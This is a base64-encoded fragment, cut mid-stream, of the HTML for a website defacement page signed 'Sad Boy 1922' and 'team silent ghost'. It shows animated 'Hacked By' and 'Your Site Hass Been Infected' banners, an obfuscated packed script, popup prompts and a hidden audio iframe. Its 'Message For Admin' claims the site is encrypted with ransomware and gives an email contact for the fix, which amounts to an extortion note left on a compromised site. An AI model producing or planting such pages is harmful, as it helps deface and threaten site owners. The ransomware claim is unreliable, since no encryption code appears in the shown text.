yBmb250LXNpemU6IDNweDsiPgo8cHJlPgoKPGxpbmsgaHJlZj0naHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9RmF1bmErT25lJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4KPGxpbmsgcmVsPSdzaG9ydGN1dCBpY29uJyBocmVmPSdodHRwOi8vbW9kZGluZ2VzcC5lcy9mYXZpY29uLmljbyc+PC9saW5rPgoKPGhlYWQ+CjxzY3JpcHQgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgp2YXIgYnJ6aW5ha3VjYW5qYSA9IDIwMDsKdmFyIHBhdXphcG9yID0gMjAwMDsKdmFyIHZyZW1laWQgPSBudWxsOwp2YXIga3JldGFuamUgPSBmYWxzZTsKdmFyIHBvcnVrYSA9IG5ldyBBcnJheSgpOwp2YXIgc2xwb3J1a2EgPSAwOwp2YXIgYmV6cG9ydWtlID0gMDsKcG9ydWthWzBdID0gIiB8IFsgSGFja2VkIEJ5ICdTYWQgQm95IDE5MjInIHwgXQpmdW5jdGlvbiBwcmlrYXooKSB7CnZhciB0ZXh0ID0gcG9ydWthW3NscG9ydWthXTsKaWYgKGJlenBvcnVrZSA8IHRleHQubGVuZ3RoKSB7CmlmICh0ZXh0LmNoYXJBdChiZXpwb3J1a2UpID09ICIgIikKYmV6cG9ydWtlKysKdmFyIHR0cG9ydWthID0gdGV4dC5zdWJzdHJpbmcoMCwgYmV6cG9ydWtlICsgMSk7CmRvY3VtZW50LnRpdGxlID0gdHRwb3J1a2E7CmJlenBvcnVrZSsrCnZyZW1laWQgPSBzZXRUaW1lb3V0KCJwcmlrYXooKSIsIGJyemluYWt1Y2FuamEpOwprcmV0YW5qZSA9IHRydWU7Cn0gZWxzZSB7CmJlenBvcnVrZSA9IDA7CnNscG9ydWthKysKaWYgKHNscG9ydWthID09IHBvcnVrYS5sZW5ndGgpCnNscG9ydWthID0gMDsKdnJlbWVpZCA9IHNldFRpbWVvdXQoInByaWtheigpIiwgcGF1emFwb3IpOwprcmV0YW5qZSA9IHRydWU7Cn0KfQpmdW5jdGlvbiBzdG9wKCkgewppZiAoa3JldGFuamUpCmNsZWFyVGltZW91dCh2cmVtZWlkKTsKa3JldGFuamUgPSBmYWxzZQp9CmZ1bmN0aW9uIHN0YXJ0KCkgewpzdG9wKCk7CnByaWtheigpOwp9CnN0YXJ0KCk7Cjwvc2NyaXB0PgoKPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+Cgo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIHwgWyBEZWZhY2VkIEJ5IFNhZCBCb3kgMTkyMiBdIHwKPG1ldGEgSFRUUC1FUVVJVj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMSIgLz4KPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiB8IFsgWW91ciBTaXRlIEhhc3MgQmVlbiBJbmZlY3RlZCAgXSB8Ij48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Ci8vPCFbQ0RBVEFbCnRyeXtpZiAoIXdpbmRvdy5DbG91ZEZsYXJlKSB7IHZhciBDbG91ZEZsYXJlPVt7dmVyYm9zZTowLHA6MCxieWM6MCxvd2xpZDowLG1pcmFnZTowLG9yYWNsZTowLHBhdGhzOntjbG91ZGZsYXJlOiIvY2RuLWNnaS9uZXhwL3Y9Mjk2NTY1MTY1OC8ifSxhdG9rOiI0NmQ3MjQ1ZGU4ZmU3NTczNjI4YTExNGU4ZDlkYWJmNCIsem9uZToiem9uZWhtaXJyb3JzLm5ldCIscm9ja2V0OiIwIixhcHBzOnsiZG5zY2hhbmdlcl9kZXRlY3RvciI6eyJmaXhfdXJsIjpudWxsfX19XTtkb2N1bWVudC53cml0ZSgnPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLy9hamF4LmNsb3VkZmxhcmUuY29tL2Nkbi1jZ2kvbmV4cC92PTMwMzc4MzAzNDAvY2xvdWRmbGFyZS5taW4uanMiPjwnKydcL3NjcmlwdD4nKX19Y2F0Y2goYSl7fTsKLy9dXT4KPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KLy88IVtDREFUQVsKd2luZG93Ll9fQ0Y9d2luZG93Ll9fQ0Z8fHt9O3dpbmRvdy5fX0NGLkFKUz17ImRuc2NoYW5nZXJfZGV0ZWN0b3IiOnsiZml4X3VybCI6bnVsbH19OwovL11dPgo8L3NjcmlwdD4KCgo8dGl0bGU+IHwgWyBSYW5zb213YXJlIEJ5IFNhZCBCb3kgMTkyMiBdIHw8L3RpdGxlPgoKPHNjcmlwdCBzcmM9Imh0dHA6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LWxhdGVzdC5taW4uanMiPjwvc2NyaXB0PgoKPHNjcmlwdD4KLy8KCnZhciBjdXJyZW50X3R5cGUgPSAxOwooZnVuY3Rpb24oJCkgewogCiAgICBmdW5jdGlvbiBzaHVmZmxlKGEpIHsKICAgICAgICB2YXIgaSA9IGEubGVuZ3RoLCBqOwogICAgICAgIHdoaWxlIChpKSB7CiAgICAgICAgICAgIHZhciBqID0gTWF0aC5mbG9vcigoaS0tKSAqIE1hdGgucmFuZG9tKCkpOwogICAgICAgICAgICB2YXIgdCA9IGFbaV07CiAgICAgICAgICAgIGFbaV0gPSBhW2pdOwogICAgICAgICAgICBhW2pdID0gdDsKICAgICAgICB9CiAgICB9CiAKICAgIGZ1bmN0aW9uIHJhbmRvbUFscGhhTnVtKCkgewogICAgICAgIHZhciBybmQgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiA2Mik7CiAgICAgICAgaWYgKHJuZCA+PSA1MikgcmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocm5kIC0gNCk7CiAgICAgICAgZWxzZSBpZiAocm5kID49IDI2KSByZXR1cm4gU3RyaW5nLmZyb21DaGFyQ29kZShybmQgKyA3MSk7CiAgICAgICAgZWxzZSByZXR1cm4gU3RyaW5nLmZyb21DaGFyQ29kZShybmQgKyA2NSk7CiAgICB9CiAKICAgICQuZm4ucm90MTMgPSBmdW5jdGlvbigpIHsKICAgICAgICB0aGlzLmVhY2goZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICQodGhpcykudGV4dCgkKHRoaXMpLnRleHQoKS5yZXBsYWNlKC9bYS16MC05XS9pZywgZnVuY3Rpb24oY2hyKSB7CiAgICAgICAgICAgICAgICB2YXIgY2MgPSBjaHIuY2hhckNvZGVBdCgwKTsKICAgICAgICAgICAgICAgIGlmIChjYyA+PSA2NSAmJiBjYyA8PSA5MCkgY2MgPSA2NSArICgoY2MgLSA1MikgJSAyNik7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChjYyA+PSA5NyAmJiBjYyA8PSAxMjIpIGNjID0gOTcgKyAoKGNjIC0gODQpICUgMjYpOwogICAgICAgICAgICAgICAgZWxzZSBpZiAoY2MgPj0gNDggJiYgY2MgPD0gNTcpIGNjID0gNDggKyAoKGNjIC0gNDMpICUgMTApOwogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoY2MpOwogICAgICAgICAgICB9KSk7CiAgICAgICAgfSk7CiAgICAgICAgcmV0dXJuIHRoaXM7CiAgICB9OwogCiAgICAkLmZuLnNjcmFtYmxlZFdyaXRlciA9IGZ1bmN0aW9uKCkgewogICAgICAgIHRoaXMuZWFjaChmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmFyICRlbGUgPSAkKHRoaXMpLCBzdHIgPSAkZWxlLnRleHQoKSwgcHJvZ3Jlc3MgPSAwLCByZXBsYWNlID0gL1teXHNdL2csCiAgICAgICAgICAgICAgICByYW5kb20gPSByYW5kb21BbHBoYU51bSwgaW5jID0gMzsKICAgICAgICAgICAgJGVsZS50ZXh0KCcnKTsKICAgICAgICAgICAgdmFyIHRpbWVyID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkZWxlLnRleHQoc3RyLnN1YnN0cmluZygwLCBwcm9ncmVzcykgKyBzdHIuc3Vic3RyaW5nKHByb2dyZXNzLCBzdHIubGVuZ3RoIC0gMSkucmVwbGFjZShyZXBsYWNlLCByYW5kb20pKTsKICAgICAgICAgICAgICAgIHByb2dyZXNzICs9IGluYwogICAgICAgICAgICAgICAgaWYgKHByb2dyZXNzID49IHN0ci5sZW5ndGggKyBpbmMpIHsgdmFyIG5zdHIgPSAkZWxlLnRleHQoKTsgJGVsZS50ZXh0KG5zdHIuc3Vic3RyaW5nKDAsbnN0ci5sZW5ndGggLSAxKSk7ICBjdXJyZW50X3R5cGUgKz0gMTsgY2xlYXJJbnRlcnZhbCh0aW1lcik7fQogICAgICAgICAgICB9LCAxMDApOwogICAgICAgIH0pOwogICAgICAgIHJldHVybiB0aGlzOwogICAgfTsKIAogICAgJC5mbi50eXBld3JpdGVyID0gZnVuY3Rpb24oKSB7CiAgICAgICAgdGhpcy5lYWNoKGZ1bmN0aW9uKCkgewogICAgICAgICAgICB2YXIgJGVsZSA9ICQodGhpcyksIHN0ciA9ICRlbGUuaHRtbCgpLCBwcm9ncmVzcyA9IDA7CiAgICAgICAgICAgICRlbGUuaHRtbCgnJyk7CiAgICAgICAgICAgIHZhciB0aW1lciA9IHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJGVsZS5odG1sKHN0ci5zdWJzdHJpbmcoMCwgcHJvZ3Jlc3MrKykgKyAocHJvZ3Jlc3MgJiAxID8gJ18nIDogJycpKTsKICAgICAgICAgICAgICAgIGlmIChwcm9ncmVzcyA+PSBzdHIubGVuZ3RoKSB7IGN1cnJlbnRfdHlwZSArPSAxOyBjbGVhckludGVydmFsKHRpbWVyKTt9CiAgICAgICAgICAgIH0sIDEwMCk7CiAgICAgICAgfSk7CiAgICAgCiAgICAgICAgcmV0dXJuIHRoaXM7CiAgICB9OwogCiAgICAkLmZuLnVuc2NyYW1ibGUgPSBmdW5jdGlvbigpIHsKICAgICAgICB0aGlzLmVhY2goZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIHZhciAkZWxlID0gJCh0aGlzKSwgc3RyID0gJGVsZS50ZXh0KCksIHJlcGxhY2UgPSAvW15cc10vLAogICAgICAgICAgICAgICAgc3RhdGUgPSBbXSwgY2hvb3NlID0gW10sIHJldmVhbCA9IDI1LCByYW5kb20gPSByYW5kb21BbHBoYU51bTsKICAgICAgICAgCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICBpZiAoc3RyW2ldLm1hdGNoKHJlcGxhY2UpKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhdGUucHVzaChyYW5kb20oKSk7CiAgICAgICAgICAgICAgICAgICAgY2hvb3NlLnB1c2goaSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHN0YXRlLnB1c2goc3RyW2ldKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgICAgc2h1ZmZsZShjaG9vc2UpOwogICAgICAgICAgICAkZWxlLnRleHQoc3RhdGUuam9pbignJykpOwogICAgICAgICAKICAgICAgICAgICAgdmFyIHRpbWVyID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICB2YXIgaSwgciA9IHJldmVhbDsKICAgICAgICAgICAgICAgIHdoaWxlIChyLS0gJiYgY2hvb3NlLmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGkgPSBjaG9vc2UucG9wKCk7CiAgICAgICAgICAgICAgICAgICAgc3RhdGVbaV0gPSBzdHJbaV07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwgY2hvb3NlLmxlbmd0aDsgaSsrKSBzdGF0ZVtjaG9vc2VbaV1dID0gcmFuZG9tKCk7CiAgICAgICAgICAgICAgICAkZWxlLnRleHQoc3RhdGUuam9pbignJykpOwogICAgICAgICAgICAgICAgaWYgKGNob29zZS5sZW5ndGggPT0gMCkgeyBjdXJyZW50X3R5cGUgKz0gMTsgY2xlYXJJbnRlcnZhbCh0aW1lcik7fQogICAgICAgICAgICB9LCAyMDApOwogICAgICAgIH0pOwogICAgICAgIHJldHVybiB0aGlzOwogICAgfTsKIAp9KShqUXVlcnkpOwoKZnVuY3Rpb24gcmVwbGFjZUFsbCh0eHQsIHJlcGxhY2UsIHdpdGhfdGhpcykgewogIHJldHVybiB0eHQucmVwbGFjZShuZXcgUmVnRXhwKHJlcGxhY2UsICdnJyksd2l0aF90aGlzKTsKfQoKZXZhbChmdW5jdGlvbihwLGEsYyxrLGUsZCl7ZT1mdW5jdGlvbihjKXtyZXR1cm4oYzxhPycnOmUocGFyc2VJbnQoYy9hKSkpKygoYz1jJWEpPjM1P1N0cmluZy5mcm9tQ2hhckNvZGUoYysyOSk6Yy50b1N0cmluZygzNikpfTt3aGlsZShjLS0paWYoa1tjXSlwPXAucmVwbGFjZShuZXcgUmVnRXhwKCdcXGInK2UoYykrJ1xcYicsJ2cnKSxrW2NdKTtyZXR1cm4gcH0oJyQoaykuMUwoYigpe2EgVT0xSyAxSigpO2Egbj0kKCIjVCIpLlMoKTtuPTFJKG4sXCcxSFwnLGsuMUcuMUYpO249bi4xRSgvMUQvLFUpOyQoIiNUIikuUyhuKTtiIHQoKXthIHU9ay52KyIgICAgICI7YSByPTA7ay52PVwnXCc7YSBSPWcoYigpe2sudj11LjFDKDAscisrKSsociYxP1wnMUJcJzpcJ1wnKTtjKHI+PXUuMUEpe2UoUik7dCgpfX0sMXopfXQoKTtzKCJwIik7JCgiIzF5IikuaigpO2EgUT1nKGIoKXtjKGg9PTIpeyQoIiMxeCIpLmYoKTskKCIjMXciKS5qKCk7ZShRKX19LGkpO2EgUD1nKGIoKXtjKGg9PTMpeyQoIiMxdiIpLmYoKTskKCIjMXUiKS5OKCk7ZShQKX19LGkpO2EgTz1nKGIoKXtjKGg9PTQpeyQoIiMxdCIpLmYoKTskKCIjMXMiKS5qKCk7ZShPKX19LGkpO2EgTT1nKGIoKXtjKGg9PTUpeyQoIiMxciIpLmYoKTskKCIjMXEiKS5OKCk7ZShNKX19LGkpO2EgTD1nKGIoKXtjKGg9PTYpeyQoIiMxcCIpLmYoKTskKCIjMW8iKS5qKCk7ZShMKX19LGkpO2EgSz1nKGIoKXtjKGg9PTcpeyQoIiMxbiIpLnEoKTskKCIjMW0iKS5mKEgpOyQoIiMxbCIpLmooKTtlKEspfX0sMWspO2EgSj1nKGIoKXtjKGg9PTgpeyQoIiMxaiIpLmYoKTskKCIjMWkiKS5qKCk7ZShKKX19LGkpO2EgRj1nKGIoKXtjKGg9PTkpe0kuMWgoMCwxZyk7SS4xZigpOyQoIiMxZSIpLmYoKTskKCIjMWQiKS5qKCk7JChcJyNwXCcpLjFjKHsxYjoiMWElIiwxOToiSCUifSxiKCl7JCgiI3AiKS5tKCJ4IiwiNSIpOyQoIiNwIikubSgidyIsIjUiKTskKCIjcCIpLm0oImQiLCQoaykuZCgpLUcpOyQoIiMxOCIpLm0oImQiLCQoaykuZCgpLUcpOyQoIiMxNyIpLmYoKX0pO2UoRil9fSxpKTthIEU9ZyhiKCl7YyhoPT0xMCl7JCgiIzE2IikucSgpOyQoIiMxNSIpLmYoKTskKCIjMTQiKS5qKCk7ZShFKX19LGkpO2EgRD1nKGIoKXtjKGg9PTExKXskKCIjMTMiKS5xKCk7JCgiI1oiKS5mKCk7JCgiI1kiKS5qKCk7ZShEKX19LGkpO2EgQz1nKGIoKXtjKGg9PTEyKXskKCIjWCIpLnEoKTskKCIjVyIpLmYoKTskKCIjViIpLmooKTtlKEMpfX0saSl9KTtzKCk7YiBzKG8pe2EgZD0kKGspLmQoKTthIGw9JChrKS5sKCk7YSBCPSQoIiMiK28pLmQoKTthIHk9JCgiIyIrbykubCgpO2Q9QS56KChkLUIpLzIpO2w9QS56KChsLXkpLzIpO2MoZDwwKXtkPTJ9YyhsPDApe2w9Mn0kKCIjIitvKS5tKCJ4IixkKTskKCIjIitvKS5tKCJ3IixsKX0nLDYyLDExMCwnfHx8fHx8fHx8fHZhcnxmdW5jdGlvbnxpZnxoZWlnaHR8Y2xlYXJJbnRlcnZhbHxzaG93fHNldEludGVydmFsfGN1cnJlbnRfdHlwZXw1MDB8dHlwZXdyaXRlcnxkb2N1bWVudHx3aWR0aHxjc3N8bWhvc3R8bG9sfHhCb2R5fGhpZGV8cHJvZ3Jlc3N8Zml4UG9zaXRpb258dGl0bGVfbWFnaWN8c3RyfHRpdGxlfGxlZnR8dG9wfG13aWR0aHxyb3VuZHxNYXRofG1oZWlnaHR8dGltZXIxMnx0aW1lcjExfHRpbWVyMTB8dGltZXI5fDEwMHw1MHx5dHBsYXllcnx0aW1lcjh8dGltZXI3fHRpbWVyNnx0aW1lcjV8c2NyYW1ibGVkV3JpdGVyfHRpbWVyNHx0aW1lcjN8dGltZXIyfHRpdGxlX3RpbWVyfGh0bWx8c3NofHRvZGF5fG15dGV4dDEyfHNzaDEyfDRzc2h8bXl0ZXh0MTF8c3NoMTF8fHx8M3NzaHxteXRleHQxMHxzc2gxMHwyc3NofHBpY3p8c3NoQm94fHJpZ2h0fDIwfGJvdHRvbXxhbmltYXRlfG15dGV4dDl8c3NoOXx1bk11dGV8ZmFsc2V8c2Vla1RvfG15dGV4dDh8c3NoOHwzMDAwfG15dGV4dDd8c3NoN3wxc3NofG15dGV4dDZ8c3NoNnxteXRleHQ1fHNzaDV8bXl0ZXh0NHxzc2g0fG15dGV4dDN8c3NoM3xteXRleHQyfHNzaDJ8bXl0ZXh0MXwyMDB8bGVuZ3RofF98c3Vic3RyaW5nfGNfdGltZXxyZXBsYWNlfGhvc3RuYW1lfGxvY2F0aW9ufGxvY2FsaG9zdHxyZXBsYWNlQWxsfERhdGV8bmV3fHJlYWR5Jy5zcGxpdCgnfCcpKSkKCjwvc2NyaXB0PgoKPGlmcmFtZSB3aWR0aD0iMCIgaGVpZ2h0PSIwIiBzcmM9Imh0dHBzOi8vYXBpLnNvdW5kY2xvdWQuY29tL3RyYWNrcy80NzMzMTAxMDIvc3RyZWFtP2NsaWVudF9pZD1hM2UwNTk1NjNkN2ZkMzM3MmI0OWIzN2YwMGEwMGJjZiIgZnJhbWVib3JkZXI9IjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT4KCgo8cCBpZD0icGVzYW4iPjwvcD4KPGRpdiBzdHlsZT0icG9zaXRpb246IGZpeGVkOyBib3R0b206IDBweDsgbGVmdDogMTBweDt3aWR0aDo5MHB4O2hlaWdodDoxMDBweDsiPjxhIGhyZWY9Imh0dHBzOi8vbmdhcmF5dy5ibG9nc3BvdC5jb20vP209MSIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHBzOi8vMS5icC5ibG9nc3BvdC5jb20vLVRfOHF1QTUxWl9nL1hBMjV1MUh2QVRJL0FBQUFBQUFBQUtBL0NsSmtFdUpVOFhJUFJUX1pzWnViNXZaTi0wQ0ZBeVlUZ0NMY0JHQXMvczE2MDAvdGVub3IlMjUyODMxJTI1MjkuZ2lmIiB0aXRsZT0iQXdva3dva3dvayIgYWx0PSJhbmltYXNpIGJlcmdlcmFrIGdpZiIgLz48L2E+PHNtYWxsPjxjZW50ZXI+PGEgaHJlZj0iaHR0cHM6Ly93d3cuc2FkYm95MTkyMi56b25lLmlkIiB0YXJnZXQ9Il9ibGFuayI+TXkgQmxvZyBTYWQgQm95PC9hPjwvY2VudGVyPjwvc21hbGw+PC9kaXY+CjxzY3JpcHQ+CmZ1bmN0aW9uIGtvbmZpcm1hc2koKXsKdmFyIHRhbnlhID0gY29uZmlybSgiU2lsZW50IEdob3N0IFdhcyBIZXJlIik7CgppZih0YW55YSA9PT0gdHJ1ZSkgewpwZXNhbiA9ICJEZWZhY2VkIGJ5IHRlYW0gc2lsZW50IGdob3N0IjsKfWVsc2V7CnBlc2FuID0gIlNhZCBCb3kgd2F0Y2hpbmcgeW91IjsKfQoKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBlc2FuIikuaW5uZXJIVE1MID0gcGVzYW47Cn0KPC9zY3JpcHQ+Cgo8c2NyaXB0Pgp2YXIgcGVzYW4gPSBwcm9tcHQoIllvdXIgU2l0ZSBIYXNzIEJlZW4gSW5mZWN0ZWQiKTsKaWYocGVzYW4hPSAiIil7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwZXNhbiIpLmlubmVySFRNTCA9ICJQZXNhbiBBbmRhIDogIiArIHBlc2FuOwp9Cjwvc2NyaXB0PgoKPHN0eWxlPgogICAgaHRtbCB7CiAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgIGZvbnQtZmFtaWx5OiAiQ291cmllciBOZXciOwogICAgICAgIGN1cnNvcjogbm9uZTsKICAgIH0KPC9zdHlsZT4KPHRhYmxlIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPgogICAgPHRkIGFsaWduPSJjZW50ZXIiPgogICAgICAgIDxiPjxpPgogICAgICAgIDxmb250IGNvbG9yPSJ3aGl0ZSI+PGZvbnQgc2l6ZT0iMjAiPllvdXIgU2l0ZSBIYXNzIGJlZW48Zm9udCBjb2xvcj0icmVkIj4gIEluZmVjdGVkPC9mb250PjwvZm9udD4KICAgICAgICA8YnI+PGJyPgogICAgICAgIAoKPGNlbnRlcj48aW1nIHNyYz0iIGh0dHBzOi8vMy5icC5ibG9nc3BvdC5jb20vLUE4VkFKNXlTc0IwL1hMeW53MXplTTBJL0FBQUFBQUFBQWV3L1ZhY1FjRzdhZkdJQm1FckRjaHZEeXB1bFRCbFo1TC1KQUNMY0JHQXMvczE2MDAvU2FkJTJCQm95LnBuZyAiIHdpZHRoPSI1NTAiIGhlaWdodD0iNTUwIj48Y2VudGVyPiAgICAgICAgCiAgICAgICAgPCEtLSBMaXZlIENoYXQgV2lkZ2V0IHBvd2VyZWQgYnkgaHR0cHM6Ly9rZXlyZXBseS5jb20vY2hhdC8gLS0+CjwhLS0gQWR2YW5jZWQgb3B0aW9uczogLS0+CjwhLS0gZGF0YS1hbGlnbj0ibGVmdCIgLS0+CjwhLS0gZGF0YS1vdmVybGF5PSJ0cnVlIiAtLT4KPHNjcmlwdCBkYXRhLWFsaWduPSJyaWdodCIgZGF0YS1vdmVybGF5PSJmYWxzZSIgaWQ9ImtleXJlcGx5LXNjcmlwdCIgc3JjPSIvL2tleXJlcGx5LmNvbS9jaGF0L3dpZGdldC5qcyIgZGF0YS1jb2xvcj0iI0ZGRUIzQiIgZGF0YS1hcHBzPSJKVGRDSlRJeWQyaGhkSE5oY0hBbE1qSTZKVEl5TURnNU5qZzFNRE01TkRBMUpUSXlMQ1V5TW1WdFlXbHNKVEl5T2lVeU1uSmhlWGN4T1RJeVFHZHRZV2xzTG1OdmJTVXlNaVUzUkE9PSI+PC9zY3JpcHQ+Cgo8Ym9keSBvbmxvYWQ9InR5cGVfdGV4dCgpIiBhbGluaz0iIzAwMDAwMCIgYmdjb2xvcj0iIzAwMDAwMCIgdmxpbms9IiMwMDAwMDAiIGxpbms9IiNjMGMwYzAiIHRleHQ9IiMwMDAwMDAiPgo8ZGl2IGFsaWduPSJjZW50ZXIiPgoKPHNjcmlwdCBsYW5ndWFnZT0iSmF2YXNjcmlwdCI+PCEtLQp2YXIgdGw9bmV3IEFycmF5KAogCiIgIiwgICAKIiAgICBNZXNzYWdlIEZvciBBZG1pbjogIiwKIiAgIC1Zb3VyIFNpdGUgaXMgZW5jcnlwdGVkIiwKIiAgIC13aXRoIFJhbnNvbXdhcmUgIiwKIiAgIC1ob3cgdG8gZml4ZWQgeW91ciBzaXRlPyIsCiIgICAtQ29udGFjdCBtZSBvbjoiLAoiICAgIiwKIiAgIC1FIG1haWw6cmF5dzE5MjJAZ21haWwuY29tIiwKIiAgIC1jaGFubmVsIHlvdXR1YmU6c2FkIGJveSAxOTIyIiwKIiAgICIsCiIgICBXZSBBcmUgU2lsZW50IEdob3N0OiAiLAoiICAgV2UgQXJlIFNpbGVudCAiLAoiICAgQnV0IERlYWRseSwiLAoiICAgRXhwZWN0IHVzcyIsCiIgICAiLAoiICAgU2VjdXJpdHkgV2VhayIsCiIgICBJbmRvbmVzaWFuIEhhY2t0aXZpc3QiLAoiICIsCgopOwp2YXIgc3BlZWQ9NDA7CnZhciBpbmRleD0wOyB0ZXh0X3Bvcz0wOwp2YXIgc3RyX2xlbmd0aD10bFswXS5sZW5ndGg7CnZhciBjb250ZW50cywgcm93OwoKZnVuY3Rpb24gdHlwZV90ZXh0KCkKewoKICBjb250ZW50cz0nJzsKICByb3c9TWF0aC5tYXgoMCxpbmRleC0xNSk7CiAgd2hpbGUocm93PGluZGV4KQogICAgY29udGVudHMgKz0gdGxbcm93KytdICsgJ1xyXG4nOwogIGRvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzBdLnZhbHVlID0gY29udGVudHMgKyB0bFtpbmRleF0uc3Vic3RyaW5nKDAsdGV4dF9wb3MpICsgInwiOwogIGlmKHRleHRfcG9zKys9PXN0cl9sZW5ndGgpCiAgewogICAgdGV4dF9wb3M9MDsKICAgIGluZGV4Kys7CiAgICBpZihpbmRleCE9dGwubGVuZ3RoKQogICAgewogICAgICBzdHJfbGVuZ3RoPXRsW2luZGV4XS5sZW5ndGg7CiAgICAgIHNldFRpbWVvdXQoInR5cGVfdGV4dCgpIiw1MDApOwogICAgfQogIH0gZWxzZQogICAgc2V0VGltZW91dCgidHlwZV90ZXh0KCkiLHNwZWVkKTsKfQovLy0tPjwvc2NyaXB0Pgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPkJPRFkgewoJU0NST0xMQkFSLUZBQ0UtQ09MT1I6ICMwMDAwMDA7IFNDUk9MTEJBUi1ISUdITElHSFQtQ09MT1I6ICMwMDAwMDA7IFNDUk9MTEJBUi1TSEFET1ctQ09MT1I6ICMwMDAwMDA7IFNDUk9MTEJBUi1CQVNFLUNPTE9SOiAjMDAwMDAwCn0KPC9zdHlsZT4KCjxzdHlsZSBmcHJvbGxvdmVyc3R5bGU9IiI+ClRFWFRBUkVBIHsKCUJPUkRFUi1MRUZULUNPTE9SOiAjMDAwMDAwOyBCQUNLR1JPVU5EOiAjMDAwMDAwOyBCT1JERVItQk9UVE9NLUNPTE9SOiAjMDAwMDAwOyBGT05UOiAxNHB4IFZlcmRhbmEsIFZlcmRhbmEsIFZlcmRhbmEsIFZlcmRhbmE7IENPTE9SOiAjZDNkM2QzOyBCT1JERVItVE9QLUNPTE9SOiAjMDAwMDAwOyBCT1JERVItUklHSFQtQ09MT1I6ICMwMDAwMDAKfQo8L3N0eWxlPgoKPGgyPjxmb250IGNvbG9yPSJ3aGl0ZSIgZmFjZT0iQ2F1cmllciIgc2l6ZT0iMTUiPlJhbnNvbXdhcmUgYnkgU2FkIEJveSAxOTIyPC9mb250PjwvaDI+Cjxmb3JtPjxmb250IGNvbG9yPSIjZmYwMDAwIj4KCTx0ZXh0YXJlYSByb3dzPSIxNCIgY29scz0iOTAiIHJlYWRvbmx5PSJyZWFkb25seSI+PC90ZXh0YXJlYT4gCjwvZm9udD48L2Zvcm0+CjxjZW50ZXI+Cjxmb250IGNvbG9yPSJhcXVhIiBzdHlsZT0idGV4dC1zaGFkb3c6IDNweCAzcHggOXB4IHdoaXRlOyBmb250LXNpemU6IDIycHg7Ij4KPHByZT4KPGJvZHk+CjxzY3JpcHQgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgp2YXIgdGV4dD0iIEdhbWUgT3ZlciBhZG1pbi4uLllvdXIgU3lzdGVtIElzIFVuZGVyY29udHJvbCAgIjsKdmFyIGRlbGF5PTEwMDsKdmFyIGN1cnJlbnRDaGFyPTE7CnZhciBkZXN0aW5hdGlvbj0iW25vbmVdIjsKZnVuY3Rpb24gdHlwZSgpCnsKLy9pZiAoZG9jdW1lbnQuYWxsKQp7CnZhciBkZXN0PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGRlc3RpbmF0aW9uKTsKaWYgKGRlc3QpLy8gJiYgZGVzdC5pbm5lckhUTUwpCnsKZGVzdC5pbm5lckhUTUw9dGV4dC5zdWJzdHIoMCwgY3VycmVudENoYXIpKyI8Ymxpbms+XzwvYmxpbms+IjsKY3VycmVudENoYXIrKzsKaWYgKGN1cnJlbnRDaGFyPnRleHQubGVuZ3RoKQp7CmN1cnJlbnRDaGFyPTE7CnNldFRpbWVvdXQoInR5cGUoKSIsIDUwMDApOwp9CmVsc2UKewpzZXRUaW1lb3V0KCJ0eXBlKCkiLCBkZWxheSk7Cn0KfQp9Cn0KZnVuY3Rpb24gc3RhcnRUeXBpbmcodGV4dFBhcmFtLCBkZWxheVBhcmFtLCBkZXN0aW5hdGlvblBhcmFtKQp7CnRleHQ9dGV4dFBhcmFtOwpkZWxheT1kZWxheVBhcmFtOwpjdXJyZW50Q2hhcj0xOwpkZXN0aW5hdGlvbj1kZXN0aW5hdGlvblBhcmFtOwp0eXBlKCk7Cn0KPC9zY3JpcHQ+IDxiPjxkaXYgMHB4PSIiIDEycHg9IiIgYXJpYWw9IiIgY29sb3I6PSIiIGFxdWE9I